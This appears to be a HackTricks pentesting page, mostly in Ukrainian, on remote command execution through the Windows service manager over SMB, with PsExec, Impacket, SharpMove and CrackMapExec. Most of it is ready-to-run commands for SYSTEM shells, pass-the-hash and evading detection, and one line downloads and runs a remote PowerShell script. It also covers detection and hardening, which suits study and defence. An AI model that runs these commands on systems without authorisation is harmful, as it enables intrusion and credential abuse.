# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Як вони працюють

Ці техніки зловживають Менеджером керування службами Windows (SCM) віддалено через SMB/RPC для виконання команд на цільовому хості. Загальний процес:

1. Аутентифікація на цільовому хості та доступ до спільного ресурсу ADMIN$ через SMB (TCP/445).
2. Копіювання виконуваного файлу або вказівка команди LOLBAS, яку служба виконає.
3. Створення служби віддалено через SCM (MS-SCMR через \PIPE\svcctl), вказуючи на цю команду або двійковий файл.
4. Запуск служби для виконання корисного навантаження та, за бажанням, захоплення stdin/stdout через іменований канал.
5. Зупинка служби та очищення (видалення служби та будь-яких скинутих двійкових файлів).

Вимоги/попередні умови:
- Локальний адміністратор на цільовому хості (SeCreateServicePrivilege) або явні права на створення служби на цільовому хості.
- Доступний SMB (445) та спільний ресурс ADMIN$; Дозволене віддалене керування службами через брандмауер хоста.
- Обмеження UAC для віддалених: з локальними обліковими записами фільтрація токенів може блокувати адміністратора через мережу, якщо не використовувати вбудованого адміністратора або LocalAccountTokenFilterPolicy=1.
- Kerberos проти NTLM: використання імені хоста/FQDN дозволяє Kerberos; підключення за IP часто повертається до NTLM (і може бути заблоковане в захищених середовищах).

### Ручний ScExec/WinExec через sc.exe

Наступне показує мінімальний підхід до створення служби. Зображення служби може бути скинутим EXE або LOLBAS, таким як cmd.exe або powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notes:
- Очікуйте помилку тайм-ауту при запуску неслужбового EXE; виконання все ще відбувається.
- Щоб залишатися більш дружніми до OPSEC, надавайте перевагу безфайловим командам (cmd /c, powershell -enc) або видаляйте скинуті артефакти.

Find more detailed steps in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Tooling and examples

### Sysinternals PsExec.exe

- Класичний інструмент адміністратора, який використовує SMB для скидання PSEXESVC.exe в ADMIN$, встановлює тимчасову службу (ім'я за замовчуванням PSEXESVC) і проксірує I/O через іменовані канали.
- Example usages:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Ви можете запускати безпосередньо з Sysinternals Live через WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Залишає події встановлення/видалення служби (Ім'я служби часто PSEXESVC, якщо не використано -r) і створює C:\Windows\PSEXESVC.exe під час виконання.

### Impacket psexec.py (схожий на PsExec)

- Використовує вбудовану службу, схожу на RemCom. Скидає тимчасовий бінарний файл служби (зазвичай з випадковою назвою) через ADMIN$, створює службу (за замовчуванням часто RemComSvc) і проксірує I/O через іменований канал.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Артефакти
- Тимчасовий EXE у C:\Windows\ (випадкові 8 символів). Ім'я служби за замовчуванням - RemComSvc, якщо не переопределено.

### Impacket smbexec.py (SMBExec)

- Створює тимчасову службу, яка запускає cmd.exe і використовує іменований канал для вводу/виводу. Загалом уникає скидання повного EXE вантажу; виконання команд є напівінтерактивним.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral та SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) реалізує кілька методів бічного переміщення, включаючи виконання на основі сервісу.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) включає модифікацію/створення служби для віддаленого виконання команди.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Ви також можете використовувати CrackMapExec для виконання через різні бекенди (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detection and artifacts

Типові артефакти хоста/мережі при використанні технік, подібних до PsExec:
- Security 4624 (Logon Type 3) та 4672 (Special Privileges) на цілі для облікового запису адміністратора, що використовується.
- Security 5140/5145 події File Share та File Share Detailed, що показують доступ до ADMIN$ та створення/запис бінарних файлів служб (наприклад, PSEXESVC.exe або випадковий 8-символьний .exe).
- Security 7045 Service Install на цілі: імена служб, такі як PSEXESVC, RemComSvc або користувацькі (-r / -service-name).
- Sysmon 1 (Process Create) для services.exe або зображення служби, 3 (Network Connect), 11 (File Create) в C:\Windows\, 17/18 (Pipe Created/Connected) для труб, таких як \\.\pipe\psexesvc, \\.\pipe\remcom_*, або випадкові еквіваленти.
- Артефакт реєстру для EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 на хості оператора (якщо не подавлено).

Ідеї для полювання
- Сповіщення про встановлення служб, де ImagePath включає cmd.exe /c, powershell.exe або TEMP-локації.
- Шукати створення процесів, де ParentImage є C:\Windows\PSEXESVC.exe або діти services.exe, що працюють як LOCAL SYSTEM, виконуючи оболонки.
- Позначати іменовані труби, що закінчуються на -stdin/-stdout/-stderr або відомі імена труб-клонів PsExec.

## Troubleshooting common failures
- Доступ заборонено (5) при створенні служб: не справжній локальний адміністратор, обмеження UAC для локальних облікових записів або захист від підробки EDR на шляху бінарного файлу служби.
- Мережева адреса не знайдена (53) або не вдалося підключитися до ADMIN$: брандмауер блокує SMB/RPC або адміністративні спільні ресурси вимкнені.
- Kerberos не вдається, але NTLM заблоковано: підключайтеся за допомогою hostname/FQDN (не IP), забезпечте правильні SPN або надайте -k/-no-pass з квитками при використанні Impacket.
- Час запуску служби вичерпано, але корисне навантаження виконано: очікується, якщо це не справжній бінарний файл служби; захопіть вихід у файл або використовуйте smbexec для живого I/O.

## Hardening notes
- Windows 11 24H2 та Windows Server 2025 вимагають підписування SMB за замовчуванням для вихідних (та Windows 11 вхідних) з'єднань. Це не порушує законне використання PsExec з дійсними обліковими даними, але запобігає зловживанню непідписаним SMB реле та може вплинути на пристрої, які не підтримують підписування.
- Нове блокування NTLM клієнта SMB (Windows 11 24H2/Server 2025) може запобігти зворотному зв'язку NTLM при підключенні за IP або до серверів, що не підтримують Kerberos. У захищених середовищах це зламає PsExec/SMBExec на основі NTLM; використовуйте Kerberos (hostname/FQDN) або налаштуйте винятки, якщо це дійсно потрібно.
- Принцип найменших привілеїв: мінімізуйте членство локальних адміністраторів, надавайте перевагу Just-in-Time/Just-Enough Admin, впроваджуйте LAPS та моніторте/сповіщайте про встановлення служб 7045.

## See also

- WMI-based remote exec (часто безфайловий):


{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM-based remote exec:


{{#ref}}
./winrm.md
{{#endref}}



## References

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- SMB security hardening in Windows Server 2025 & Windows 11 (підписування за замовчуванням, блокування NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
